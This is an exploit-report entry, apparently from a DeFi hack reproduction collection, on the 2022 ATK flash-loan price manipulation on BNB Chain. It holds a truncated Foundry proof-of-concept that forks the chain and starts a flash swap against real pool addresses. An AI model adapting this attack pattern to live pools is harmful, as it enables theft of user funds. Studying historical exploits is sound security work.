# [?] ATK - FlashLoan manipulate price

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ATK
Published: 2022-10-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ATK_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~127K BUSD

```solidity
contract ContractTest is Test {
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant ATK_TOKEN = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant ATK_BUSDT_PAIR = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    address constant EXPLOIT_CONTRACT = 0xD7ba198ce82f4c46AD8F6148CCFDB41866750231;
    address constant EXPLOIT_AUX_CONTRACT = 0x96bF2E6CC029363B57Ffa5984b943f825D333614;

    uint256 swapamount;

    function setUp() public {
        vm.createSelectFork("bsc", 22_102_838);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(ATK_TOKEN), "ATK_TOKEN");
        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(ATK_BUSDT_PAIR), "ATK_BUSDT_PAIR");
        vm.label(EXPLOIT_CONTRACT, "EXPLOIT_CONTRACT");
        vm.label(EXPLOIT_AUX_CONTRACT, "EXPLOIT_AUX_CONTRACT");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker ATK balance before exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
        );

        WBNB_TOKEN.deposit{value: 2 ether}();
        _WBNBToBUSDT();

        swapamount = BUSDT_TOKEN.balanceOf(address(ATK_BUSDT_PAIR)) - 3 * 1e18;
        ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ATK_exp.sol_
